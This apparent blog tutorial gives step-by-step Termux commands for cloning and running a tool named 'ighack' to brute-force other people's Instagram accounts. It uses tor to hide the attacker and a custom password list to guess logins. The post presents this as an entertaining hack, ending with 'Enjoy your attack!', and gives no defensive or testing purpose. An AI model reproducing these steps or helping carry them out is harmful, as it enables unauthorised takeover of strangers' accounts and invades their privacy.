# Hacking Instagram Accounts from Android Using Termux

Hello guys! I'm back with another amazing post. Today, we'll learn about hacking Instagram accounts. Many of my followers have asked me about hacking Instagram accounts from an Android device with easy steps. Hacking Instagram is not child's play, so we have to use some scripts to accomplish this task. We'll be using an app called Termux, which is available for Android devices. With this app, you can do lots of stuff with the help of our website by getting tutorials from here. Let's dive into the practical tutorial now.

## Follow Below Steps

1. Make sure you have already installed the Termux app and updated it with stable packages.

    ```
    $ apt-get update -y
    $ apt-get upgrade -y
    $ pkg install python -y
    $ pkg install python2 -y
    $ pkg install git -y
    $ pip install lolcat
    $ git clone https://github.com/noob-hackers/ighack
    $ cd ighack
    $ bash setup
    $ bash ighack.sh
    ```

    Now you need an internet connection to continue the further process.

    You can select any option by clicking on your keyboard.

    **Note:** Don't delete any of the scripts included in core files.

2. Now open a new session and type `tor` in it, then come back to the old session and start the IG hack tool. Begin attacking the ID of the account you want to hack.

3. There is also an option for a custom password list in the tool, so please use the proper location to use that password list.

    **Example:** `/sdcard/Download/pass.txt`

    Use the location in the custom password list attack as shown above. Enjoy your attack!
